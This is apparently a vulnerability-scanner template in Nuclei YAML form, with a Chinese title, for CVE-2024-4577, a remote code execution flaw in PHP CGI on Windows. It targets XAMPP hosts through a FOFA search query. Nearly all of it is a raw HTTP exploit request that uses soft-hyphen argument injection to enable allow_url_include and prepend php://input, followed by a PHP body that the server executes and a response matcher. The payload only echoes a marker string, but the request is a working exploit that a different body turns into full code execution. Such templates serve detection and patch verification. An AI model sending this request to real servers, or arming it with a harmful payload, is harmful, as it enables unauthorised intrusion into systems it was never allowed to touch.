id: PHP-CGI-Windows-RCE-CVE-2024-4577

info:
  name: PHP CGI Windows平台远程代码执行漏洞(CVE-2024-4577)
  author: onewin
  severity: critical
  description: PHP CGI Windows平台远程代码执行漏洞(CVE-2024-4577)
  metadata:
    fofa-query: app="XAMPP"
  tags: php,rce,cve

http:
- raw:
  - |-
    @timeout: 30s
    POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
    Host: {{Hostname}}
    User-Agent: curl/8.3.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 22

    <?php echo "666666";?>

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "666666"
      condition: and


